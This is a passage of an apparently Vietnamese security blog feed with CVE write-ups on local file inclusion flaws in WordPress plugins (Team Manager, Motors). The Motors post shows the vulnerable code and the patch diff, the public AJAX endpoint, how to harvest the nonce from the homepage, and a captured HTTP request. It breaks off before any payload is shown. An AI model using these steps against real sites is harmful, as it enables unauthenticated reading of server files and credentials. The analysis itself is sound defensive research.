1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-30868 là LFI trong Team Manager ≤2.1.23: &lt;code&gt;renderElementorLayout()&lt;/code&gt; không xác thực &lt;code&gt;$layout&lt;/code&gt;/&lt;code&gt;$settings&lt;/code&gt;, cho phép path traversal và &lt;code&gt;include()&lt;/code&gt; file ngoài ý muốn. Đã vá trong &lt;strong&gt;v2.2.0&lt;/strong&gt; bằng whitelist, regex và kiểm tra &lt;code&gt;realpath()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không dùng input thô để build &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;strong&gt;whitelist&lt;/strong&gt; cho layout/template.&lt;/li&gt;&#xA;&lt;li&gt;Sanitize tên file + &lt;code&gt;realpath()&lt;/code&gt; + &lt;code&gt;is_readable()&lt;/code&gt; trước khi include.&lt;/li&gt;&#xA;&lt;li&gt;Với endpoint public: kiểm soát input server-side, nonce không đủ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-team-manager/vulnerability/wordpress-team-manager-plugin-2-1-23-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Team Manager Plugin &amp;lt;= 2.1.23 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32654 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-14-cve-2025-32654/</link>
      <pubDate>Tue, 14 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-14-cve-2025-32654/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Motors&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 1.4.71&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32654&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32654&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.4.71&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.4.72&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/motors-car-dealership-classified-listings/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Motors Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Motors&lt;/strong&gt;: &lt;strong&gt;1.4.71&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.4.72&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;$template = sanitize_text_field( $_POST[&amp;#39;template&amp;#39;] );&#xA;&#x9;// other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản lỗi &lt;strong&gt;chỉ lọc ký tự HTML&lt;/strong&gt; bằng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt;, không giới hạn đường dẫn, nên attacker có thể chèn &lt;code&gt;../&lt;/code&gt; hoặc tên file bất kỳ =&amp;gt; &lt;code&gt;LFI&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;$allowed_templates = array(&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop-4&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop-3&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop&amp;#39;,&#xA;&#x9;);&#xA;&#x9;$template = &amp;#39;listing-cars/&amp;#39; . ( isset( $_POST[&amp;#39;template&amp;#39;] ) ? sanitize_file_name( $_POST[&amp;#39;template&amp;#39;] ) : &amp;#39;&amp;#39; );&#xA;&#x9;if ( ! in_array( $template, $allowed_templates, true ) ) {&#xA;&#x9;&#x9;wp_send_json_error( &amp;#39;Invalid template&amp;#39; );&#xA;&#x9;&#x9;return;&#xA;&#x9;}&#xA;&#x9;// other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá áp dụng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_file_name/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt;&lt;/a&gt; + &lt;strong&gt;whitelist&lt;/strong&gt; kiểm tra hợp lệ, giúp khóa chặt input và loại bỏ hoàn toàn khả năng khai thác thông qua tham số template.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Hàm &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; được đăng ký làm &lt;strong&gt;callback&lt;/strong&gt; cho &lt;strong&gt;action hook&lt;/strong&gt; có tên &lt;code&gt;&amp;quot;grid_tabs_widget&amp;quot;&lt;/code&gt; thông qua đoạn mã:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_grid_tabs_widget&amp;#39;, array( self::class, &amp;#39;motors_ew_grid_tabs&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiền tố &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; cho biết action này &lt;strong&gt;không yêu cầu người dùng đăng nhập&lt;/strong&gt; khi gọi đến endpoint AJAX.&#xA;Do đó, endpoint thực tế có thể được truy cập công khai qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=grid_tabs_widget&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;check_ajax_referer( &amp;#39;motors_grid_tabs&amp;#39;, &amp;#39;security&amp;#39; );&#xA;&#xA;&#x9;$listing_types = apply_filters( &amp;#39;stm_listings_post_type&amp;#39;, &amp;#39;listings&amp;#39; );&#xA;&#xA;&#x9;$tab_type = sanitize_text_field( $_POST[&amp;#39;tab_type&amp;#39;] );&#xA;&#x9;$per_page = intval( $_POST[&amp;#39;per_page&amp;#39;] );&#xA;&#x9;$template = sanitize_text_field( $_POST[&amp;#39;template&amp;#39;] );&#xA;&#x9;$img_size = sanitize_text_field( $_POST[&amp;#39;img_size&amp;#39;] );&#xA;&#xA;&#x9;$args = array(&#xA;&#x9;&#x9;&amp;#39;post_type&amp;#39;      =&amp;gt; $listing_types,&#xA;&#x9;&#x9;&amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;publish&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;posts_per_page&amp;#39; =&amp;gt; $per_page,&#xA;&#x9;);&#xA;&#xA;&#x9;if ( &amp;#39;popular&amp;#39; === $tab_type ) {&#xA;&#x9;&#x9;$args = array_merge(&#xA;&#x9;&#x9;&#x9;$args,&#xA;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;orderby&amp;#39;  =&amp;gt; &amp;#39;meta_value_num&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;meta_key&amp;#39; =&amp;gt; &amp;#39;stm_car_views&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;order&amp;#39;    =&amp;gt; &amp;#39;DESC&amp;#39;,&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$args[&amp;#39;meta_query&amp;#39;][] = array(&#xA;&#x9;&#x9;&amp;#39;key&amp;#39;     =&amp;gt; &amp;#39;car_mark_as_sold&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;value&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;compare&amp;#39; =&amp;gt; &amp;#39;=&amp;#39;,&#xA;&#x9;);&#xA;&#xA;&#x9;$template_args = array();&#xA;&#x9;if ( ! empty( $img_size ) ) {&#xA;&#x9;&#x9;$template_args = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;custom_img_size&amp;#39; =&amp;gt; $img_size,&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$listings_query = new WP_Query( $args );&#xA;&#xA;&#x9;if ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;&#x9;$output = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;ob_start();&#xA;&#x9;&#x9;while ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;&#x9;&#x9;$listings_query-&amp;gt;the_post();&#xA;&#x9;&#x9;&#x9;do_action( &amp;#39;stm_listings_load_template&amp;#39;, $template, $template_args );&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;$output .= ob_get_clean();&#xA;&#x9;}&#xA;&#xA;&#x9;wp_send_json(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;html&amp;#39; =&amp;gt; $output,&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt;, dòng đầu tiên:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;motors_grid_tabs&amp;#39;, &amp;#39;security&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;thực hiện &lt;strong&gt;kiểm tra nonce&lt;/strong&gt; để bảo vệ khỏi &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&#xA;Nếu nonce gửi từ client không hợp lệ hoặc không tồn tại, hàm này sẽ &lt;strong&gt;dừng toàn bộ quá trình xử lý AJAX&lt;/strong&gt; - nghĩa là các đoạn logic phía sau (bao gồm xử lý &lt;code&gt;$template&lt;/code&gt;, truy vấn bài viết, và render HTML) sẽ &lt;strong&gt;không được thực thi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_create_nonce() {&#xA;&#x9;$grid_tabs_widget = wp_create_nonce( &amp;#39;motors_grid_tabs&amp;#39; );&#xA;&#x9;// other logic&#xA;&#x9;wp_localize_script(&#xA;&#x9;&#x9;&amp;#39;jquery&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;mew_nonces&amp;#39;,&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;motors_grid_tabs&amp;#39; =&amp;gt; $grid_tabs_widget,&#xA;&#x9;&#x9;&#x9;// other logic&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;motors_create_nonce()&lt;/code&gt; tạo nonce cho action &lt;code&gt;&#39;motors_grid_tabs&#39;&lt;/code&gt; bằng &lt;code&gt;wp_create_nonce()&lt;/code&gt; rồi truyền sang JavaScript qua &lt;code&gt;wp_localize_script()&lt;/code&gt; dưới biến &lt;code&gt;mew_nonces.motors_grid_tabs&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Vì lỗ hổng này là loại &lt;strong&gt;Unauthenticated&lt;/strong&gt;, nên &lt;strong&gt;nonce&lt;/strong&gt; không được hiển thị trong khu vực &lt;strong&gt;admin&lt;/strong&gt;.&#xA;Thay vào đó, hãy truy cập &lt;strong&gt;trang chủ&lt;/strong&gt; sau khi plugin đã được cài đặt đầy đủ các phụ thuộc, rồi tìm từ khóa &lt;code&gt;motors_grid_tabs&lt;/code&gt; trong mã nguồn trang để lấy giá trị &lt;strong&gt;nonce&lt;/strong&gt; cần thiết.&lt;/p&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/nonce.png&#34;&#xA;    alt=&#34;Giá trị nonce hiển thị trong mã nguồn trình duyệt&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Giá trị nonce hiển thị trong mã nguồn trình duyệt&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ngoài ra, trong mã nguồn trang chủ còn có đoạn JavaScript thực hiện &lt;strong&gt;gọi AJAX tự động&lt;/strong&gt; đến endpoint ta đang focus:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=grid_tabs_widget&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;khi trang được tải:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;&#xA;&#x9;(function($) {&#xA;&#x9;&#x9;$(document).ready(function() {&#xA;&#x9;&#x9;&#x9;$.ajax({&#xA;&#x9;&#x9;&#x9;&#x9;type: &amp;#34;POST&amp;#34;,&#xA;&#x9;&#x9;&#x9;&#x9;url: ajaxurl,&#xA;&#x9;&#x9;&#x9;&#x9;dataType: &amp;#39;json&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;async: true,&#xA;&#x9;&#x9;&#x9;&#x9;data: &amp;#39;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=listing-cars/listing-grid-directory-loop-4&amp;amp;img_size=&amp;amp;security=&amp;#39; &amp;#43; mew_nonces.motors_grid_tabs,&#xA;&#x9;&#x9;&#x9;&#x9;success: function(data) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;if( data.hasOwnProperty(&amp;#39;html&amp;#39;) ) $(&amp;#39;#popular-tab-content&amp;#39;).html(data.html);&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;updateGridItemTitles();&#xA;&#x9;&#x9;&#x9;&#x9;},&#xA;&#x9;&#x9;&#x9;});&#xA;&#x9;&#x9;});&#xA;&#x9;})(jQuery)&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đoạn script tự động chạy vì nằm trong &lt;code&gt;$(document).ready()&lt;/code&gt;, nên khi trang load xong, jQuery sẽ tự thực thi hàm AJAX.&lt;/p&gt;&#xA;&lt;p&gt;Tận dụng điều này, ta reload trang chủ và bắt ajax request bằng &lt;strong&gt;BurpSuite&lt;/strong&gt;, để lấy các param cần thiết do plugin cung cấp.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;X-Requested-With: XMLHttpRequest&#xA;Content-Length: 168&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Referer: http://localhost/&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: 